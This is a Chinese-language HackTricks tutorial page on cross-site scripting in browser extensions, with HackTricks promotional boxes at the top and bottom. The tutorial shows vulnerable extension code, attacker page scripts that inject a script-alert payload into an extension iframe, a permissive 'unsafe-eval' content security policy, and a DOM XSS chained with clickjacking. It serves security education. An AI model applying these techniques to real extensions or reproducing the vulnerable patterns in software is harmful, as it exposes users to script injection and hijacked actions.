# BrowExt - XSS 示例

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## 在 Iframe 上的 XSS

**内容脚本** 创建了一个 Iframe，并在 Iframe 源的参数中指定了一个 **URL**：
```javascript
chrome.storage.local.get("message", result =>
{
frame.src = chrome.runtime.getURL("message.html") +
"?message=" + encodeURIComponent(result.message) +
"&url=https://example.net/explanation";
});
```
暴露的HTML页面：**`message.html`**，可以通过**浏览器**访问，包含如下代码：
```java
$(() =>
{
let params = new URLSearchParams(location.search);
$(document.body).append(params.get("message") + " <button>Explain</button>");
$("body > button").click(() =>
{
chrome.tabs.create({ url: params.get("url") });
});
});
```
恶意页面执行如下脚本来将消息更改为**XSS payload**：
```javascript
setTimeout(() =>
{
let frame = document.querySelector("iframe:last-child");
let src = frame.src;

// Remove existing query parameters
src = src.replace(/\?.*/, "");

// Add malicious query parameters
src += "?message=" + encodeURIComponent("<script>alert('XSS')</script>");

// Load into frame
frame.src = src;
}, 1000);
```
```markdown
一个宽松的内容安全策略，例如
```
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
将允许执行JS代码。

另一种按需触发XSS的方法是运行：
```javascript
let frame = document.createElement("iframe");
frame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?message="
+ encodeURIComponent("<script>alert('XSS')</script>");
document.body.appendChild(frame);
```
## 基于DOM的XSS + 点击劫持

第一个漏洞是位于 **`/html/bookmarks.html`** 的基于DOM的跨站脚本（XSS）漏洞，以下是包含的 **`bookmarks.js`** 中的易受攻击的JavaScript代码：
```javascript
$('#btAdd').click(function() {
var btname = $('#txtName').val();
if ($('.custom-button .name').filter(function() {
return $(this).text() === btname;
}).length) return false;

var span = $('<span class="custom-button">');
span.html('<span class="name">' + btname + '</span>');
span.append('<a href="javascript:void(0)" title="remove">x</a>');
span.attr('title', btname);
span.data('id', (new Date().getTime()));
$('div.custom-buttons .existing').append(span);
save_options();
});
```
上述JavaScript代码取得**`txtName`** 文本框的**值**，并使用**字符串拼接构建HTML**，然后通过jQuery的[“append()”](https://api.jquery.com/append/)函数追加到DOM中。

通常，Chrome扩展的内容安全策略（CSP）应该防止这种漏洞被利用。然而，由于通过[**‘unsafe-eval’**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)放宽了此策略，并使用了jQuery的DOM API，这个漏洞仍然可以被**利用**。这是因为jQuery的许多DOM API使用了[“globalEval()”](https://api.jquery.com/jquery.globaleval/)，它会在脚本追加到DOM时自动调用[“eval()”](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)。

虽然这是一个严重的漏洞，但由于需要**用户互动来利用它**，单独利用它的范围相当有限。受害者必须打开页面，将跨站脚本（XSS）有效载荷粘贴到字段中，并点击“添加”按钮来利用它。

为了更好地利用这个漏洞，我们利用了另一个漏洞（**clickjacking**）来增强攻击。

以下是Chrome扩展清单文件的摘录：
```json
...trimmed for brevity...
"web_accessible_resources": [
"_locales/*",
"bundle/*",
"dist/*",
"assets/*",
"font/*",
"html/bookmarks.html",
"css/*.css",
"js/*.js",
"js/jquery/*.js",
"js/lang/*"
],
...trimmed for brevity...
```
上述部分展示了扩展通过其 **`web_accessible_resources`** 策略广泛地捕获资源。

**`/html/bookmarks.html`** 页面也能够被**框架化**，因此可以通过**点击劫持**被**利用**。我们滥用这一点，在我们的网页中嵌入此页面，并**用DOM元素覆盖框架来重新布局**。这使得受害者不知道他们**实际上是在与下面的扩展交互**。下面的动画演示了这种效果（查看动画请访问[**原始帖子写作**](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)）。

## 参考资料

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>
